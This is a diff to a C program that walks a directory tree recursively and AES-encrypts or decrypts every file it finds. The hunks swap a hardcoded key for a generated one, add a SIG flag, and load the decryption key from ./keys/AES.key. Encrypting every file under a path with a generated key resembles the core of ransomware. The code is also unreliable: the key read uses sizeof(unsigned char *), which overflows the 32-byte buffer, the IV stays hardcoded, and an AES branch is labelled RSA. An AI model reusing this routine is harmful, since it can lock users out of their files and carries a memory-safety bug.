@@ -1,6 +1,6 @@
 #include "./redundant.h"
 
-void walk(const char *basePath, FileStruct *file, int encoder_ID, char *args[]){
+void walk(const char *basePath, FileStruct *file, int encoder_ID, char *args[], int *SIG){
     struct dirent *entry;
     DIR *dir = opendir(basePath);
 
@@ -20,10 +20,10 @@ void walk(const char *basePath, FileStruct *file, int encoder_ID, char *args[]){
         struct stat statbuf;
         if (stat(path, &statbuf) == 0) {
             if (S_ISDIR(statbuf.st_mode)) {
-                walk(path, file, encoder_ID, args); // Recursive call
+                walk(path, file, encoder_ID, args, SIG); // Recursive call
             } else {
                 printf("File: %s\n", path);
-		        handleFile(path, file, encoder_ID, args);
+		        handleFile(path, file, encoder_ID, args, SIG);
             }
         }
     }
@@ -66,7 +66,7 @@ void writeFile(const char *name, uint8_t *content, uint64_t size) {
 	fwrite(content, 1, size, fp);
 }
 
-void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]) {
+void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[], int *SIG) {
     if (checkFile(filename) == 1) {
         return;  
     }
@@ -108,12 +108,11 @@ void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]) 
         }
         case 3:{
             printf("Encoding using RSA\n");
-            unsigned char key[AES_KEY_SIZE] = {
-                0x7c, 0x7d, 0x39, 0xd6, 0xac, 0xb8, 0xd9, 0x18,
-                0xf4, 0xe1, 0xc8, 0x4a, 0x76, 0x8c, 0x05, 0xef,
-                0x34, 0xc6, 0x4f, 0xa2, 0x76, 0x76, 0xf3, 0x9e,
-                0x94, 0xf1, 0x08, 0x71, 0xb7, 0x5b, 0x7c, 0x3a
-            };
+            if (*SIG != 300){
+                *SIG = 300;
+            }
+            unsigned char *key = (unsigned char *)malloc(32);
+            AES_generateKey(key);
             unsigned char iv[AES_IV_SIZE] = {
                 0x4d, 0x7f, 0x8e, 0x3b, 0xde, 0xaf, 0x31, 0xc1,
                 0x94, 0x75, 0xfe, 0x8e, 0x1a, 0x83, 0xe1, 0x7b
@@ -137,15 +136,16 @@ void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]) 
             free(input_data);
             free(output_data);
             free(file->buffer);
+            free(key);
             break;
         }
         case 31:{
-            unsigned char key[AES_KEY_SIZE] = {
-                0x7c, 0x7d, 0x39, 0xd6, 0xac, 0xb8, 0xd9, 0x18,
-                0xf4, 0xe1, 0xc8, 0x4a, 0x76, 0x8c, 0x05, 0xef,
-                0x34, 0xc6, 0x4f, 0xa2, 0x76, 0x76, 0xf3, 0x9e,
-                0x94, 0xf1, 0x08, 0x71, 0xb7, 0x5b, 0x7c, 0x3a
-            };
+            unsigned char *key = (unsigned char *)malloc(32);
+            printf("Reading key\n");
+            FILE *keyFile = fopen("./keys/AES.key", "rb");
+            fread(key, sizeof(unsigned char *), 32, keyFile);
+            fclose(keyFile);
+
             unsigned char iv[AES_IV_SIZE] = {
                 0x4d, 0x7f, 0x8e, 0x3b, 0xde, 0xaf, 0x31, 0xc1,
                 0x94, 0x75, 0xfe, 0x8e, 0x1a, 0x83, 0xe1, 0x7b
@@ -167,6 +167,7 @@ void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]) 
             free(input_data);
             free(decrypted_data);
             free(file->buffer);
+            free(key);
         }
     }
 
